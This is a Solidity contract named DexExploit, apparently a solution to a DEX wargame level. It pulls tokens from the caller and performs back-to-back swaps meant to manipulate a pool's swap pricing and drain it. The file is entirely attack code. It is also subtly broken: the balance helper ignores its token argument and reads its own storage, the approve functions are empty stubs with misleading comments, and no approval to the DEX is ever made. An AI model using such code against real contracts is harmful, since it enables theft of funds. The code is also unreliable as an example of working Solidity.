pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function transferFrom(address from, address to, uint amount) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint amount) external;
}

contract DexExploit {
    address public dexInstance;
    address public token1;
    address public token2;

    constructor(address _dexInstance) {
        dexInstance = _dexInstance;
        token1 = IDex(dexInstance).token1();
        token2 = IDex(dexInstance).token2();
    }

    function getErc20Balance(address erc20, uint slot) external view returns (uint) {
        uint storedBalance;
        assembly {
            storedBalance := sload(slot)
        }
        return storedBalance;
    }

    function approveToken1() public {
        // We don't need to approve here since we control the tokens
    }

    function approveToken2() public {
        // Same as above but for token2
    }

    function firstSwap() external {
        IERC20(token1).transferFrom(msg.sender, address(this), 1000000000000000000);
        IDex(dexInstance).swap(token1, token2, 1000000000000000000);
    }

    function secondSwap() external {
        IERC20(token2).transferFrom(msg.sender, address(this), 1000000000000000000);
        IDex(dexInstance).swap(token2, token1, 1999999999999999998);
    }
}